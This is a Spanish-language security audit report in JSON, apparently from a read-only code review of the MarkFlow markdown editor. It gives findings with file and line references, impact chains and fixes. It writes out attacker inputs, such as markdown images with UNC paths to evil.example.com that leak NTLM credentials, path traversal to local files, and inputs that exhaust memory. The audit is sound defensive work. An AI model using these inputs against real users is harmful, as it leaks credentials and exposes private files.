@@ -1,0 +1,226 @@
+{
+  "cazador": "archivos-e-imagenes",
+  "unidades": ["U-04", "U-05", "U-14"],
+  "metodo": "Solo lectura de codigo. No se compilo, no se ejecuto, no se instalo nada, no se hizo ninguna peticion de red. Archivos leidos: src/widgets.ts, src/livepreview.ts, src/contexto.ts, src/refresco.ts, src/editor.ts, src/archivo.ts, src/preferencias.ts, src/main.ts, src-tauri/src/lib.rs, y dentro de node_modules: @codemirror/view/dist/index.js (la llamada a widget.toDOM) y @lezer/markdown/dist/index.js (TaskMarker).",
+  "comprobaciones": [
+    {
+      "unidad": "U-04",
+      "que_revise": "Travesia con `..` en la rama relativa (src/widgets.ts:180-182): base + '\\' + decodeURI(fuente) con las barras cambiadas, sin normalizar y sin comprobar que el resultado siga bajo la base. `![](../../../../Windows/Web/Wallpaper/Windows/img0.jpg)` sale de la carpeta del documento, y los `..` de sobra son inofensivos en la raiz, asi que el atacante no necesita acertar la profundidad.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Ruta absoluta `C:\\...` o `C:/...` (src/widgets.ts:179): la regex /^([a-z]:[\\/]|\\\\)/i devuelve la cadena del tercero TAL CUAL, sin decodeURI y sin normalizar. El destino de la lectura lo elige el .md, no el usuario.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Ruta UNC `\\\\servidor\\...` (src/widgets.ts:179, misma rama): pasa verbatim hasta fs::metadata/fs::read en src-tauri/src/lib.rs:145,160, y la puerta de remotas (esRemota, :167) nunca la ve porque solo casa /^https?:/i.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Porcentajes que decodeURI transforma. decodeURI SI decodifica %2e (.), %5c (\\) y %20 (espacio); NO decodifica %2f (/) ni los demas reservados. `%5c%5cservidor%5cx.png` no llega a UNC: la comprobacion de la :179 se hace ANTES del decodeURI, asi que cae a la rama relativa y queda `C:\\base\\\\\\\\servidor\\x.png`, que Win32 colapsa a una subcarpeta local. `%2e%2e%2f` no sirve (%2f no se decodifica); `%2e%2e/` si, pero es lo mismo que `..`, ya cubierto.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Byte nulo `![](a%00.png)`: decodeURI produce un NUL interior, y la conversion de Rust a UTF-16 para la WinAPI rechaza las cadenas con NUL interior (InvalidInput). No hay truncamiento de extension; el error vuelve como texto.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Flujos de datos alternos (ADS). `secreto.txt:algo.png` -> Path::extension() da `png` y se acepta, pero lee el flujo alterno (vacio en un archivo normal), no el contenido principal. `secreto.txt::$DATA` -> la extension queda `txt::$DATA`, que no esta en la tabla de tipo_por_extension (lib.rs:118-131) y se rechaza. No encontre forma de leer el contenido principal de un archivo sin extension de imagen por esta via.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Nombres reservados de Windows: `NUL.png`, `CON.png`, `COM1.png` pasan el filtro de extension. NUL devuelve cero bytes (imagen rota, sin divulgacion). Si hubiera un puerto COM fisico, fs::read podria quedarse esperando; no se puede decidir leyendo codigo y no produce divulgacion, asi que no se promueve.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Enlaces simbolicos y uniones de directorio: el .md no puede crearlos, y seguir uno existente es la misma lectura que la travesia, sin autoridad nueva. Tampoco hay comprobar-luego-usar, porque leer_imagen no escribe.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "El .svg y el `<img src=\"data:image/svg+xml;base64,...\">` (widgets.ts:245). El dato solo llega a img.src, nunca a innerHTML ni a object/iframe/embed (no existen en el modulo). Un SVG cargado como imagen se renderiza en modo estatico seguro: sin scripts y sin referencias externas. NO hay ejecucion por esta via.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Contenido que no es imagen con extension de imagen (un .png que en realidad es HTML o JS): `<img>` no olfatea el contenido, la decodificacion falla y salta el manejador de error (widgets.ts:239-242), que escribe con textContent. Sin ejecucion.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "Oraculo de disco: leer_imagen distingue cuatro errores (no existe + RUTA COMPLETA en lib.rs:146; pesa N MB en :149-154; no parece imagen en :158; no se pudo leer en :160) y todos acaban en caja.textContent (widgets.ts:248). Un .md puede sondear existencia, tamano y legibilidad de rutas arbitrarias. Dentro de estas unidades NO hay canal de salida: el unico lector es la propia victima, porque no hay ejecucion de guion ni escritura de red en este camino. Se anota dentro del candidato de la raiz comun, no como hallazgo aparte.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-04",
+      "que_revise": "decodeURI con secuencia porcentual mal formada (widgets.ts:182): lanza URIError de forma sincrona dentro de toDOM, y CodeMirror llama a widget.toDOM(view) sin try/catch (node_modules/@codemirror/view/dist/index.js:2157).",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "Mayusculas y minusculas del esquema: `HTTP://`, `hTtPs:`. Las dos regex llevan la bandera i (widgets.ts:167 y :178), asi que ni se salta la puerta ni se cuela por la rama local.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "`data:` y `blob:`: rutaAbsoluta devuelve null (:178), cargarImagen devuelve la cadena tal cual (:187) y acaba en img.src (:245). `data:` pinta una imagen embebida (un SVG ahi tampoco ejecuta) y `blob:` no resuelve. Ninguno contacta la red.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "`file:`, `about:`, `javascript:`, `ftp:`, `ws:`: no casan con ninguna de las dos regex, asi que se tratan como ruta relativa y se concatenan a la carpeta base; el resultado es una ruta invalida de Windows y leer_imagen falla con texto. Nunca llegan a img.src mientras haya carpeta base, y `javascript:` en img.src tampoco ejecutaria.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "`//servidor/x.png` CON carpeta base: no casa con :178 ni con :179, cae a la rama relativa y queda `C:\\base\\\\\\servidor\\x.png`; Win32 colapsa los separadores repetidos de en medio y da una subcarpeta local. No hay peticion de red.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "`//servidor/x.png` SIN carpeta base (pestana nueva sin archivo, src/main.ts:120 fijarCarpeta(null)): rutaAbsoluta devuelve null por falta de base (:180-181), cargarImagen devuelve la cadena cruda (:187) y llega a img.src (:245), donde la resuelve el webview contra el origen de la pagina.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "Orden de las comprobaciones de la puerta (widgets.ts:209): esRemota() && !remotasPermitidas && !permitidasSueltas.has(). Si esRemota da falso NO hay puerta de ninguna clase: se cae directo al camino de imagen local. La puerta clasifica por PREFIJO DE CADENA mientras el sumidero decide por la semantica de rutas de Windows y del navegador; ese desacuerdo es la raiz de los dos candidatos de red.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "Redirecciones despues de conceder: img.src sigue la redireccion y el permiso esta atado a la URL de antes, asi que el consentimiento se da a un anfitrion y la peticion puede terminar en otro. No se puede leer la respuesta (imagen de otro origen). Endurecimiento, no hallazgo.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "Conceder un permiso suelto sin intervencion del usuario: el unico camino a permitidasSueltas.add() es el mousedown del boton (widgets.ts:221-227). El .md no puede dibujar HTML ni CSS (F1), asi que no puede tapar, mover ni disfrazar ese boton. No hay via automatica.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "Vida del permiso suelto: se vacia al abrir otro archivo (main.ts:364) y en las dos recargas por cambio externo (:585, :603), pero NO al cambiar de pestana (activar(), main.ts:101-113). El conjunto es global del modulo y la clave es la URL cruda.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "permitirRemotas(v) (widgets.ts:158-160) guarda lo que traiga P.imagenesRemotas sin coaccion de tipo, y preferencias.leer() no valida tipos (preferencias.ts:103-113): un \"false\" de cadena abriria la puerta. Quien escribe localStorage no es mi atacante (el autor del .md no llega ahi); queda para la unidad de preferencias.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-05",
+      "que_revise": "cacheImagenes (widgets.ts:145, 188-191): no tiene tope de entradas ni de bytes, no se vacia nunca (no hay un solo .delete ni .clear en el modulo) y la clave es la ruta concatenada SIN normalizar, asi que el mismo archivo de disco entra tantas veces como formas de escribirlo tenga el .md. El tope de 25 MB de lib.rs:116,148 es por imagen, no del total.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-14",
+      "que_revise": "Que el desplazamiento guardado apunte siempre al caracter correcto. TaskMarker lo emite @lezer/markdown con longitud fija de 3 (cx.elt('TaskMarker', leaf.start, leaf.start+3)) y solo si la linea casa /^\\[[ xX]\\][ \\t]/ dentro de un ListItem. Asi que desde = nodo.from + 1 (livepreview.ts:216) es siempre el caracter de en medio, y el cambio {from: desde, to: desde+1} cubre exactamente ese caracter. El markdown del tercero no puede alargar ni acortar el marcador para correr la escritura.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-14",
+      "que_revise": "Desplazamiento desfasado entre el dibujado y el clic. El campo de estado reconstruye TODAS las decoraciones en cada docChanged y en cada movimiento de cursor (livepreview.ts:382-387), y WidgetCasilla.eq (widgets.ts:118-120) compara `desde` ademas de `marcada`: si el texto de arriba corrio la casilla, el widget nuevo no es igual y CodeMirror rehace el DOM con un cierre nuevo. Un cierre viejo solo sobrevive cuando el desplazamiento no cambio, que es justo cuando sigue siendo correcto.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-14",
+      "que_revise": "Desfase entre los dos paneles. reflejar() (editor.ts:106-115) reenvia todo cambio que no venga ya reflejado y que no sea undo/redo, de forma sincrona dentro de dispatchTransactions, y deshacer/rehacer se ejecutan en las dos vistas a la vez. Los dos documentos son siempre identicos, asi que el cambio de la casilla no puede caer en otra posicion en el otro panel.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-14",
+      "que_revise": "Carrera con la recarga silenciosa por cambio externo (main.ts:573-598): el clic puede caer entre el `if (!p.sucio)` de la :582 y el par.cargar() de la :586. La escritura entra en el documento de ANTES de la recarga y luego setState la tira. No escribe en posicion equivocada: se pierde el clic. Ademas ahi el atacante tendria que ser otro proceso local, no el autor del .md. Defecto de la reconciliacion (main.ts), no de la casilla.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-14",
+      "que_revise": "Si el clic llega solo al disco. No hay autoguardado: se quito el 2026-09-16 (ESPEC.md:89) y no queda ni un setInterval en main.ts. La casilla ensucia el buffer y nada mas; el archivo solo se toca con un guardado deliberado.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-14",
+      "que_revise": "ignoreEvent(): false (widgets.ts:137-139): CodeMirror ademas procesa el mousedown por su cuenta y coloca el cursor en el renglon, lo que destapa el texto crudo. Es cosmetico; no produce un segundo cambio ni otra via de escritura.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-14",
+      "que_revise": "Confusion visual: poner una casilla debajo de otro control (por ejemplo el boton Mostrarla de una imagen bloqueada). El .md no puede aportar HTML ni CSS (F1: HTMLBlock/HTMLTag no estan en los mapas de livepreview.ts:36-54), asi que no puede superponer ni disfrazar elementos.",
+      "resultado": "limpio"
+    }
+  ],
+  "candidatos": [
+    {
+      "titulo": "Una imagen con ruta UNC hace que MarkFlow contacte al servidor del atacante sin pasar por la puerta de imagenes remotas",
+      "unidad": "U-04",
+      "unidades_tocadas": ["U-04", "U-05"],
+      "archivo": "src/widgets.ts",
+      "linea": 179,
+      "frontera_violada": "F5/F6. El programa promete dos cosas por escrito: que una imagen local se resuelve contra la carpeta del archivo abierto (widgets.ts:169-176) y que «las imagenes del disco no tienen este problema» de contactar a un tercero (src/preferencias.ts:63-71), con la puerta de la :209 para las que si son de internet. La linea 179 devuelve la cadena del .md tal cual cuando empieza por dos barras invertidas o por «letra:», y esa cadena se la come fs::metadata/fs::read. La puerta clasifica por prefijo de cadena (/^https?:/i, :167); el sumidero clasifica por semantica de rutas de Windows. En ese desacuerdo cabe la red entera.",
+      "entrada_del_atacante": "\"![](\\\\evil.example.com\\pub\\x.png)\" — dos barras invertidas literales al principio del destino, en la primera pantalla del .md. Variantes de la misma raiz: \"![](\\\\192.0.2.10\\pub\\x.png)\" (sin DNS), \"![](\\\\evil.example.com@SSL@443\\pub\\x.png)\" y \"![](\\\\evil.example.com@80\\pub\\x.png)\" (WebDAV, salen por 443/80 cuando el 445 esta cerrado), \"![](C:/Users/Public/Documents/x.png)\" (ruta absoluta) y \"![](../../../../../../Windows/Web/Wallpaper/Windows/img0.jpg)\" (travesia relativa).",
+      "cadena_hasta_el_impacto": "1) entrada: el .md de tercero. src/livepreview.ts:199-209 detecta el nodo Image y captura el destino con la regex de la :201 sobre el TEXTO CRUDO del nodo (no sobre el destino que ya deshizo los escapes de markdown), asi que las dos barras invertidas del archivo llegan intactas a new WidgetImagen(m[2], ...). 2) propagacion: src/widgets.ts:209, la puerta — esRemota() (:167) es /^https?:/i y una ruta UNC no casa, o sea que no se dibuja la tarjeta de aviso y no se pide permiso. 3) propagacion: src/widgets.ts:244 -> :186 cargarImagen -> :177 rutaAbsoluta. 4) propagacion: src/widgets.ts:179 — /^([a-z]:[\\/]|\\\\)/i casa y hace `return fuente`: sin decodeURI, sin normalizar, sin comprobar que sea local. 5) propagacion: src/widgets.ts:190 invoke('leer_imagen', { ruta }). 6) sumidero: src-tauri/src/lib.rs:145 fs::metadata(&p) y :160 fs::read(&p) sobre una ruta UNC — Windows resuelve el nombre y abre sesion SMB (o WebDAV con las formas @80/@SSL) contra el anfitrion que nombro el .md.",
+      "impacto": "Con solo abrir el archivo — que es el camino de entrada previsto, doble clic y asociacion de .md — y con el modo de fabrica «ambos» (preferencias.ts:71) que dibuja el panel de presentacion, el equipo de la victima hace la resolucion de nombre y la conexion al anfitrion del atacante: le confirma que el archivo se abrio y cuando, le revela la IP publica, y en el saludo SMB le entrega el nombre del equipo, el dominio, el usuario y una respuesta NTLMv2, que es material de credencial para descifrar fuera de linea o retransmitir. No hay tarjeta, no hay boton, no hay preferencia que lo apague: es exactamente el aviso que la interfaz SI da para https://. La misma raiz, por la rama absoluta y por los `..`, deja ademas que el .md elija QUE archivo del disco se lee y se dibuja (filtrado a extensiones de imagen, lib.rs:118-131) y convierte los cuatro errores distintos de leer_imagen en un oraculo de existencia, tamano y legibilidad de rutas arbitrarias; eso ultimo, dentro de estas unidades, solo lo ve la propia victima: no encontre canal de salida sin una ejecucion de guion que no pertenece a mis unidades. HECHO QUE FALTA: que Windows mande NTLM al anfitrion concreto, y que arranque el servicio WebClient para las formas @80/@SSL, es comportamiento del sistema operativo y no del repositorio; se confirma con una captura en un anfitrion propio de la red del dueno. El salto de la puerta y la llamada al sistema de archivos con la ruta del tercero si son de codigo.",
+      "severidad": "alta",
+      "confianza": "confirmada_por_codigo",
+      "arreglo_minimo": "En rutaAbsoluta, antes de todo: rechazar lo que empiece por dos barras invertidas o dos barras normales (ruta de red, nunca es «imagen de disco»), y para el resto resolver y normalizar la ruta y comprobar que siga colgando de carpetaActual(). Lo que no cuelgue no se bloquea a secas: se manda a la MISMA tarjeta de consentimiento que ya existe para las remotas (widgets.ts:209-235), mostrando la ruta resuelta. Asi no se contradice la doctrina de «sin restriccion de rutas» de ESPEC.md §2: esa doctrina es sobre los archivos que elige EL USUARIO, y aqui la ruta la elige el contenido de un tercero, que es otro principal. Regresion: un .md con una ruta UNC no debe producir ninguna llamada a leer_imagen."
+    },
+    {
+      "titulo": "Un .md de unos kilobytes retiene gigabytes: cacheImagenes no tiene tope, no se vacia nunca y la clave no esta normalizada",
+      "unidad": "U-05",
+      "unidades_tocadas": ["U-05", "U-04"],
+      "archivo": "src/widgets.ts",
+      "linea": 191,
+      "frontera_violada": "El unico limite de memoria del camino de imagenes es el tope de 25 MB POR IMAGEN de src-tauri/src/lib.rs:116,148. Nada acota el numero de entradas ni el total, y nada las libera: no hay un solo .delete ni .clear sobre cacheImagenes en el modulo, ni al cambiar de pestana, ni al abrir otro archivo, ni al cerrarla. Ademas la clave es la cadena concatenada en :182 sin normalizar, asi que un mismo archivo de disco ocupa tantas entradas como formas de escribir su ruta.",
+      "entrada_del_atacante": "Una sola linea del .md con muchas escrituras distintas de la MISMA imagen: \"![](foto.png)![](./foto.png)![](.//foto.png)![](x/../foto.png)![](././foto.png)![](.///foto.png)...\" junto a un foto.png de 24 MB en el mismo zip. Sin adjuntar nada, usando la rama absoluta y un archivo grande que ya esta en el disco: \"![](C:/Windows/Web/Wallpaper/Windows/img0.jpg)![](C:/./Windows/Web/Wallpaper/Windows/img0.jpg)![](C:/Windows/./Web/Wallpaper/Windows/img0.jpg)...\"",
+      "cadena_hasta_el_impacto": "1) entrada: src/livepreview.ts:199-209 — construir() recorre el documento entero y crea un WidgetImagen por cada imagen, sin tope de cantidad. 2) propagacion: src/widgets.ts:244 -> :186 rutaAbsoluta concatena sin normalizar, asi que ./foto.png, .//foto.png y x/../foto.png son tres claves distintas del mismo archivo. 3) propagacion: src/widgets.ts:188-191 — cada clave nueva dispara su propio invoke('leer_imagen') y guarda la promesa en el Map. 4) propagacion: src-tauri/src/lib.rs:148 aplica el tope de 25 MB a esa llamada, y :160-161 lee el archivo completo y lo codifica; el resultado es una cadena base64 de ~1.33 veces el tamano del archivo. 5) sumidero: cacheImagenes (src/widgets.ts:145) retiene cada una de esas cadenas mientras viva el proceso.",
+      "impacto": "Memoria retenida = N x 1.33 x tamano del archivo, con N puesto por el .md y sin techo. Con la imagen de 24 MB y 50 escrituras — alrededor de un kilobyte de markdown — son unos 1.6 GB retenidos; con 500, unos 16 GB, y el proceso se queda sin memoria. El atacante no necesita adjuntar nada: la rama absoluta le deja apuntar a un archivo grande que ya existe en el disco de la victima. Ademas cada clave nueva es una lectura completa del archivo y una codificacion base64 del lado de Rust, o sea cientos de lecturas de decenas de MB casi a la vez. El programa se vuelve inservible y arrastra a la maquina al intercambio; no hay perdida de datos ni ejecucion. LO QUE NO SE MIDIO (no se ejecuto nada): cuantos widgets dibuja CodeMirror de golpe — solo llama a toDOM en lo visible, pero una linea larga se dibuja entera y al bajar por el documento se dibujan todas — y en que punto exacto muere el proceso.",
+      "severidad": "media",
+      "confianza": "confirmada_por_codigo",
+      "arreglo_minimo": "Tres lineas y media: (a) normalizar la ruta antes de usarla como clave y como ruta, para que el mismo archivo sea una sola entrada; (b) poner tope al Map, por numero de entradas y por bytes acumulados, con desalojo del mas viejo; (c) vaciarlo donde ya se vacian los permisos sueltos (main.ts:364, 585, 603) y al cerrar pestana. Regresion: un documento con N escrituras distintas de la misma imagen debe producir UNA sola llamada a leer_imagen y una sola entrada."
+    },
+    {
+      "titulo": "El permiso de imagen remota concedido en un documento sigue vigente al cambiar de pestana",
+      "unidad": "U-05",
+      "archivo": "src/widgets.ts",
+      "linea": 156,
+      "frontera_violada": "El propio codigo escribe la invariante dos veces: «los permisos de una nota no valen para otra» (widgets.ts:162) y «los permisos de imagen remota son por documento: no se heredan» (main.ts:363). permitidasSueltas es un conjunto global del modulo, con la URL cruda por clave, y se vacia al ABRIR otro archivo (main.ts:364) y en las dos recargas por cambio externo (:585, :603), pero activar(), que es el cambio de pestana (main.ts:101-113), no lo vacia. La invariante real es «por apertura», no «por documento».",
+      "entrada_del_atacante": "Dos .md del mismo atacante, por ejemplo un \"manual.md\" y un \"leeme.md\", los dos con la misma linea: \"![](https://evil.example.com/p.png)\"",
+      "cadena_hasta_el_impacto": "1) entrada: la victima abre los dos archivos; cada abrirRuta vacia el conjunto (main.ts:364), asi que al principio los dos piden permiso. 2) propagacion: en la pestana A la victima pica «Mostrarla» — src/widgets.ts:221-227 hace permitidasSueltas.add(this.fuente) con la URL cruda. 3) propagacion: la victima cambia a la pestana B con un clic en la barra; main.ts:101-113 activar() fija la carpeta y restaura los estados, pero no llama a olvidarPermisosSueltos(). 4) sumidero: al redibujarse el documento B, la comprobacion de src/widgets.ts:209 encuentra la URL en el conjunto, no dibuja la tarjeta y carga la imagen (img.src en :245).",
+      "impacto": "El servidor del atacante recibe una segunda peticion desde un documento en el que la victima nunca dio permiso y sin ver la tarjeta que le advierte que pedirla revela su IP. Lo que gana concretamente es la confirmacion de que su segundo archivo tambien se abrio, mas otra huella de IP y hora; no puede distinguir cual documento fue, porque la clave es la URL exacta y tiene que repetirla. Es poco, pero es exactamente la promesa que el programa hace por escrito, y el usuario cree que cada documento pregunta aparte.",
+      "severidad": "baja",
+      "confianza": "confirmada_por_codigo",
+      "arreglo_minimo": "Una linea: llamar a olvidarPermisosSueltos() dentro de activar() (main.ts, junto al fijarCarpeta de la :106). Mejor todavia, y sigue siendo pequeno: mover el conjunto dentro de la Pestana, para que el permiso viva y muera con su documento en vez de en una variable de modulo. Regresion: conceder en la pestana A y cambiar a la B debe volver a mostrar la tarjeta."
+    },
+    {
+      "titulo": "Sin carpeta base, la cadena del markdown llega cruda a img.src y una URL sin esquema se vuelve peticion de red sin puerta",
+      "unidad": "U-05",
+      "archivo": "src/widgets.ts",
+      "linea": 187,
+      "frontera_violada": "Misma raiz que el candidato de la UNC: la puerta decide por prefijo de cadena (/^https?:/i, :167) y el sumidero decide por otra cosa — aqui, por como resuelve el webview una URL relativa al protocolo. Cuando no hay carpeta base, rutaAbsoluta devuelve null (:180-181) y cargarImagen entrega la cadena del tercero SIN TOCAR (:187), que acaba en img.src (:245).",
+      "entrada_del_atacante": "\"![](//evil.example.com/p.png)\" — sin esquema, con dos barras normales. Solo funciona en una pestana sin archivo: con carpeta base esa misma cadena acaba en una subcarpeta local inofensiva.",
+      "cadena_hasta_el_impacto": "1) entrada: markdown de tercero en una pestana nueva y sin guardar — main.ts:115-126 nuevaVacia() hace fijarCarpeta(null), igual que cerrarPestana cuando no queda ninguna (main.ts:146-151) y que el arranque sin archivo inicial. 2) propagacion: src/widgets.ts:209 — esRemota da falso porque la cadena no empieza por http, asi que no hay puerta. 3) propagacion: :186 rutaAbsoluta -> :178 no casa, :179 no casa, :180-181 carpetaActual() es null y devuelve null. 4) propagacion: :187 cargarImagen devuelve Promise.resolve(fuente), la cadena cruda. 5) sumidero: :245 img.src = '//evil.example.com/p.png', que el webview resuelve contra el origen de la pagina.",
+      "impacto": "Si el origen que sirve Tauri 2 en Windows es http(s), la imagen se pide a evil.example.com sin tarjeta y sin permiso: la misma senal que la puerta existe para evitar (confirmacion de lectura mas IP). La entrega es mas estrecha que la del candidato de la UNC — pide que el markdown ajeno entre a una pestana nueva, o sea pegado, no por doble clic — pero pegar texto ajeno en una nota nueva es uso normal de este programa. HECHO QUE FALTA: el esquema y el origen reales con los que WebView2 sirve la pagina no estan en el repositorio (tauri.conf.json solo fija csp: null y withGlobalTauri). Comprobacion segura del dueno, sin tocar internet: pestana nueva, pegar la linea y mirar en las herramientas de desarrollo a donde resuelve, o apuntarla a un servidor propio de la LAN.",
+      "severidad": "baja",
+      "confianza": "necesita_validacion",
+      "arreglo_minimo": "No entregar nunca la cadena del tercero a img.src: si rutaAbsoluta devuelve null por falta de base, tratarla como remota y mandarla a la tarjeta de consentimiento. Con el arreglo del candidato de la UNC — decidir por destino resuelto y no por prefijo — este cae solo."
+    },
+    {
+      "titulo": "Un destino de imagen con un porcentaje mal formado lanza una excepcion en medio del dibujado del panel",
+      "unidad": "U-04",
+      "archivo": "src/widgets.ts",
+      "linea": 182,
+      "frontera_violada": "El panel de presentacion tiene que sobrevivir a cualquier .md: es un lector de archivos de terceros. decodeURI lanza URIError con cualquier % suelto o mal formado, y lo hace de forma sincrona dentro de toDOM, que es el peor sitio: CodeMirror llama a widget.toDOM(view) sin ninguna proteccion (node_modules/@codemirror/view/dist/index.js:2157).",
+      "entrada_del_atacante": "\"![](50%)\" o \"![](a%zz.png)\" o \"![](100%25%)\"",
+      "cadena_hasta_el_impacto": "1) entrada: src/livepreview.ts:199-209 — la regex de la :201 acepta 50% como destino y crea el WidgetImagen. 2) propagacion: src/widgets.ts:244 toDOM llama a cargarImagen. 3) propagacion: :186 rutaAbsoluta; la cadena no casa con :178 ni con :179, asi que llega a la :182. 4) sumidero: decodeURI('50%') lanza URIError; no hay try/catch en widgets.ts, ni en livepreview.ts, ni en la llamada de CodeMirror. Al abrir el archivo la excepcion sube hasta el catch de abrirRuta (main.ts:373), que ya habia creado la pestana (:353-360) y ya habia hecho fuente.setState (editor.ts:178) pero no presentacion.setState (:179).",
+      "impacto": "La victima ve el dialogo «No se pudo abrir el archivo» aunque el archivo si se abrio y esta en la pestana, con el panel de presentacion a medio dibujar, y cada redibujado posterior de ese widget vuelve a lanzar. No hay perdida de datos, ni escritura, ni ejecucion: se cierra la pestana y ya. Se anota porque es una linea de markdown que deja media interfaz inconsistente y porque el arreglo son tres lineas. HECHO QUE FALTA: el estado final exacto de la vista (panel vacio, editor que no responde, o solo ese widget perdido) depende de como se recupera CodeMirror de una excepcion a media actualizacion; eso pide ejecucion y aqui no se ejecuto nada.",
+      "severidad": "baja",
+      "confianza": "necesita_validacion",
+      "arreglo_minimo": "Envolver el decodeURI de la :182 en try/catch y caer a la cadena cruda, y de paso hacer que toDOM no pueda lanzar nunca (envolver el cuerpo y dibujar el recuadro de «imagen rota» si algo falla). Regresion: un .md con ![](50%) debe abrirse sin dialogo de error y mostrar una imagen rota."
+    }
+  ]
+}
